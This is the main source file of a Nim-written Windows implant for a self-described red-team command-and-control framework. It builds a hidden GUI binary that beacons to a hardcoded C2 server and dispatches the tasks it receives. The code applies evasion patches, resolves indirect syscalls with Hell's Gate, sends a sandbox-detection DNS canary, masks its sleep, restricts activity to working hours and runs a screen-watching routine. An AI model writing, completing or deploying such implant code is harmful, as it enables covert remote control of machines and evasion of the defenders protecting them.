## REDTEAM C2 — Nim Windows agent
## Speaks the same HTTP/mTLS protocol as the Go agent.
## Build: nim compile --os:windows --cpu:amd64 --cc:gcc
##   --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc
##   -d:release -d:danger --app:gui --opt:size
##   -d:serverUrl=https://10.2.20.200:8443 -d:sleepSec=60 agent.nim

import std/[os, times, strutils, random]
import winim/lean
import config, transport, commands, evasion, syscalls

# DNS canary: fire-and-forget A lookup so the server detects sandbox analysis.
# Only compiled in when a CanaryDomain is baked in at build time.
when CanaryDomain != "":
  var canaryWsaBuf: array[408, byte]
  proc canaryWsaStartup(v: uint16; d: pointer): int32
    {.stdcall, dynlib: "ws2_32", importc: "WSAStartup".}
  proc canaryGethostbyname(n: cstring): pointer
    {.stdcall, dynlib: "ws2_32", importc: "gethostbyname".}
  proc canaryDnsLookup() =
    discard canaryWsaStartup(0x0202, addr canaryWsaBuf[0])
    discard canaryGethostbyname(cstring("canary." & CanaryDomain))

proc killDateCheck() =
  when KillDate != "":
    try:
      let kd = parse(KillDate, "yyyy-MM-dd")
      if now() > kd:
        quit(0)
    except: discard

proc main() =
  randomize()

  # KillDate check
  killDateCheck()

  # Evasion patches
  when not defined(noEvasion):
    applyEvasion()

  # Indirect syscall stubs (Hell's Gate SSN resolution)
  initSyscalls()

  # Canary DNS lookup — triggers server-side burn detection if this binary is
  # sandbox-analyzed before it registers. Fire-and-forget; result is irrelevant.
  when CanaryDomain != "":
    canaryDnsLookup()

  # Init transport
  var t = newTransport()

  # Register — retry until success
  while true:
    if t.register(): break
    sleepMasked(30_000)

  # Beacon loop
  while true:
    killDateCheck()
    if not inWorkingHours():
      sleepUntilWorkHours()
      continue
    try:
      let tasks = t.beacon()
      for task in tasks:
        dispatchTask(t, task.id, task.typ, task.args, task.payload)
    except: discard
    screenwatchTick(t)
    sleepMasked(currentSleepMs())

when isMainModule:
  main()
